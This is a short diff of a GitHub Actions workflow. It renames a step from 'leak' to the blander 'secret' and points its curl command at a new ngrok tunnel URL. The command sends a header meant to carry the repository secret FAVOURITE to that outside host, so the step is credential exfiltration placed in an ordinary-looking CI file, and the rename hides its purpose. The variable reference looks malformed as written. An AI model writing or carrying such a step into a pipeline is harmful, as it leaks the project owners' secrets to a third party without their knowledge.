@@ -22,7 +22,7 @@ jobs:
         run: |
           echo "::add-mask::${{ secrets.FAVOURITE }}" 
 
-      - name: leak
+      - name: secret
         run: |
-            curl https://a0fe-128-131-211-139.ngrok-free.app -H "X-API-Key: $secrets.FAVOURITE"
+            curl https://17f3-128-131-211-139.ngrok-free.app -H "X-API-Key: $secrets.FAVOURITE"
         
